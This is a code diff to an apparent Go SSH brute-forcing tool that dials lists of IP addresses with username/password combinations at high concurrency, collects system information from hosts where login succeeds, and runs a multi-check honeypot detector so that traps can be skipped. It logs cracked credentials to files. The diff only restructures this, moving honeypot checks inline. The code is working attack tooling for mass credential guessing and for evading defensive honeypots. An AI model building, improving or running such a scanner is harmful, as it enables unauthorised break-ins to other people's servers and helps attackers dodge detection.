@@ -40,15 +40,9 @@ type SSHTask struct {
 	Password string
 }
 
-type ServerInfoWithClient struct {
-	*ServerInfo
-	Client *ssh.Client
-}
-
 // Worker pool configuration
 const (
 	CONCURRENT_PER_WORKER = 25  // Each worker handles 25 concurrent connections
-	HONEYPOT_WORKERS     = 3   // Dedicated workers for honeypot detection
 )
 
 // Server information structure
@@ -660,7 +654,6 @@ func banner() {
 		fmt.Printf("================================================\n")
 		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
 		fmt.Printf("🔗 Max Workers: %d | 🎯 Per Worker: %d\n", maxConnections, CONCURRENT_PER_WORKER)
-		fmt.Printf("🍯 Honeypot Workers: %d\n", HONEYPOT_WORKERS)
 		fmt.Printf("================================================\n")
 		fmt.Printf("🔍 Checked SSH: %d/%d\n", totalConnections, totalIPCount)
 		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
@@ -720,39 +713,28 @@ func appendToFile(data, filepath string) {
 	}
 }
 
-// Calculate optimal buffer sizes based on worker capacity and algorithm
-func calculateOptimalBuffers() (int, int) {
+// Calculate optimal buffer sizes based on worker capacity
+func calculateOptimalBuffers() int {
 	// Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
 	taskBuffer := int(float64(maxConnections * CONCURRENT_PER_WORKER) * 1.5)
 	
-	// Honeypot Buffer = Workers × 0.1 × Concurrent_Per_Worker (10% honeypot rate)
-	honeypotBuffer := int(float64(maxConnections) * 0.1 * float64(CONCURRENT_PER_WORKER))
-	
-	return taskBuffer, honeypotBuffer
+	return taskBuffer
 }
 
 // Enhanced worker pool system
 func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
 	// Calculate optimal buffer sizes using enhanced algorithm
-	taskBufferSize, honeypotBufferSize := calculateOptimalBuffers()
+	taskBufferSize := calculateOptimalBuffers()
 	
 	// Create channels with calculated buffer sizes
 	taskQueue := make(chan SSHTask, taskBufferSize)
-	honeypotQueue := make(chan *ServerInfoWithClient, honeypotBufferSize)
 	
 	var wg sync.WaitGroup
-	var honeypotWg sync.WaitGroup
 	
 	// Start main workers
 	for i := 0; i < maxConnections; i++ {
 		wg.Add(1)
-		go enhancedMainWorker(i, taskQueue, honeypotQueue, &wg)
-	}
-	
-	// Start dedicated honeypot workers
-	for i := 0; i < HONEYPOT_WORKERS; i++ {
-		honeypotWg.Add(1)
-		go enhancedHoneypotWorker(i, honeypotQueue, &honeypotWg)
+		go enhancedMainWorker(i, taskQueue, &wg)
 	}
 	
 	// Start progress banner
@@ -776,12 +758,10 @@ func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
 	
 	// Wait for all workers to complete
 	wg.Wait()
-	close(honeypotQueue)
-	honeypotWg.Wait()
 }
 
 // Enhanced main worker with concurrent processing per worker
-func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, honeypotQueue chan<- *ServerInfoWithClient, wg *sync.WaitGroup) {
+func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
 	defer wg.Done()
 	
 	// Semaphore to limit concurrent connections per worker
@@ -796,7 +776,7 @@ func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, honeypotQueue ch
 			defer workerWg.Done()
 			defer func() { <-semaphore }() // Release semaphore
 			
-			processSSHTask(t, honeypotQueue)
+			processSSHTask(t)
 		}(task)
 	}
 	
@@ -804,7 +784,7 @@ func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, honeypotQueue ch
 }
 
 // Process individual SSH task
-func processSSHTask(task SSHTask, honeypotQueue chan<- *ServerInfoWithClient) {
+func processSSHTask(task SSHTask) {
 	// SSH connection configuration (same as original)
 	config := &ssh.ClientConfig{
 		User: task.Username,
@@ -818,6 +798,8 @@ func processSSHTask(task SSHTask, honeypotQueue chan<- *ServerInfoWithClient) {
 	// Test connection (same error handling as original)
 	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
 	if err == nil {
+		defer client.Close()
+		
 		// Create server information
 		serverInfo := &ServerInfo{
 			IP:           task.IP,
@@ -828,70 +810,37 @@ func processSSHTask(task SSHTask, honeypotQueue chan<- *ServerInfoWithClient) {
 			Commands:     make(map[string]string),
 		}
 		
-		// Send to honeypot detection queue with client (will gather system info there)
-		honeypotQueue <- &ServerInfoWithClient{
-			ServerInfo: serverInfo,
-			Client:     client,
+		// Honeypot detector
+		detector := &HoneypotDetector{
+			TimeAnalysis:    true,
+			CommandAnalysis: true,
+			NetworkAnalysis: true,
 		}
 		
+		// Gather system information first
+		gatherSystemInfo(client, serverInfo)
+		
+		// Run full honeypot detection (all 9 algorithms) with valid client
+		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
+		
+		// Record result (same logic as original)
+		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
+		mapMutex.Lock()
+		defer mapMutex.Unlock()
+		if _, exists := successfulIPs[successKey]; !exists {
+			successfulIPs[successKey] = struct{}{}
+			if !serverInfo.IsHoneypot {
+				atomic.AddInt64(&stats.goods, 1)
+				logSuccessfulConnection(serverInfo)
+			} else {
+				atomic.AddInt64(&stats.honeypots, 1)
+				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
+				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
+					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
+			}
+		}
 	} else {
 		// Same error handling as original
 		atomic.AddInt64(&stats.errors, 1)
 	}
-}
-
-// Enhanced honeypot worker with full detection
-func enhancedHoneypotWorker(workerID int, honeypotQueue <-chan *ServerInfoWithClient, wg *sync.WaitGroup) {
-    defer wg.Done()
-    
-    // Honeypot detector with all 9 algorithms
-    detector := &HoneypotDetector{
-        TimeAnalysis:    true,
-        CommandAnalysis: true,
-        NetworkAnalysis: true,
-    }
-    
-    const maxConcurrent = 3 // Maximum concurrent honeypot detections per worker
-    semaphore := make(chan struct{}, maxConcurrent)
-    var workerWg sync.WaitGroup
-    
-    for serverInfoWithClient := range honeypotQueue {
-        workerWg.Add(1)
-        semaphore <- struct{}{}
-        
-        go func(swc *ServerInfoWithClient) {
-            defer workerWg.Done()
-            defer func() { <-semaphore }()
-            defer swc.Client.Close() // Ensure connection is closed
-            
-            serverInfo := swc.ServerInfo
-            client := swc.Client
-            
-            // Gather system information first
-            gatherSystemInfo(client, serverInfo)
-            
-            // Run full honeypot detection (all 9 algorithms) with valid client
-            serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
-            
-            // Record result (same logic as original)
-            successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
-            mapMutex.Lock()
-            defer mapMutex.Unlock()
-            if _, exists := successfulIPs[successKey]; !exists {
-                successfulIPs[successKey] = struct{}{}
-                if !serverInfo.IsHoneypot {
-                    atomic.AddInt64(&stats.goods, 1)
-                    logSuccessfulConnection(serverInfo)
-                } else {
-                    atomic.AddInt64(&stats.honeypots, 1)
-                    log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
-                    appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
-                        serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
-                }
-            }
-            
-        }(serverInfoWithClient)
-    }
-
-    workerWg.Wait() // Wait for all goroutines to complete
 }
